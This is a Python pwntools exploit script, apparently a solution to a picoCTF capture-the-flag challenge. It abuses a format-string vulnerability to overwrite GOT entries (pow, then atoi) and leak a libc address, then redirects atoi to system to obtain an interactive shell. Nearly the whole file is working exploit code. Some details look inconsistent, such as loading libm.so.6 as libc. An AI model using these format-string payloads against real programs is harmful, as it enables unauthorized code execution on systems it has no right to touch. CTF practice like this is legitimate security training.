from pwn import *
exe = ELF("chall")
# libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
libc = ELF("/lib/x86_64-linux-gnu/libm.so.6")

context.binary = exe
context.terminal = "kitty"

offset___libc_start_main_ret = 0x026fc0
offset_system = 0x0000000000055410
# offset___libc_start_main_ret_local = 0xac0b3c2270
# offset_system_local = 0x050d60

# r = remote("mars.picoctf.net", 31929)
r = process('./chall')

'''#############
leak libc address
#############'''
payload1 = b'1 %2082c%12$hn  ' + p64(exe.got['pow'])
payload2 = b'2 %109$p'
r.recvuntil(b'A: ')
r.sendline(payload1)
r.recvuntil(b'B: ')
r.sendline(payload2)
print(r.recvuntil(b" 2 0x"))
return_value = int(r.recv(12).strip(), 16)
libc_addr = return_value - 243 - offset___libc_start_main_ret
success(f"Return Value = {hex(return_value)}")
success(f"libc address = {hex(libc_addr)}")
success(f"libc system address = {hex(libc_addr + offset_system)}")
# success(f"libc system address = {hex(libc_addr + offset_system_local)}")
# success(f"libc address = {hex(libc_addr - offset___libc_start_main_ret_local)}")


'''#############
Get Shell
#############'''
# raw_input()
third = (libc.sym['system']>>16)&0xff
bottom = libc.sym['system'] & 0xffff
first = third - 21
second = bottom - third

payload1 = f'1 %{first}c%43$hhn%{second}c%44$hn'
payload2 = b'2'.ljust(8, b' ') + p64(exe.got['atoi']+2) + p64(exe.got['atoi'])
r.recvuntil(b'A: ')
r.sendline(payload1)
r.recvuntil(b'B: ')
r.sendline(payload2)

r.interactive()
